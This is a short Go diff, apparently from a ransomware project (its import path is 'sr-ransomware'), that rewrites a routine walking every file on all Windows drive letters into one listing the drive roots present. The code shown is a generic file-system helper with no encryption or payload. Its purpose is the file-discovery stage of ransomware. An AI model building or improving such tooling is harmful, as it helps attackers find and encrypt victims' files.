@@ -9,15 +9,14 @@ import (
     "github.com/sug0/sr-ransomware/go/errors"
 )
 
-func WallAllDrives(f func(path string)) {
-    for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
-        filepath.Walk(string(drive) + `:\`, func(path string, info os.FileInfo, err error) error {
-            if err == nil {
-                f(path)
-            }
-            return nil
-        })
+func AllDrives() (drives []string) {
+    for _, letter := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
+        drive := string(letter) + `:\`
+        if _, err := os.Stat(drive); err == nil {
+            drives = append(drives, drive)
+        }
     }
+    return
 }
 
 func Move(to, from string) error {
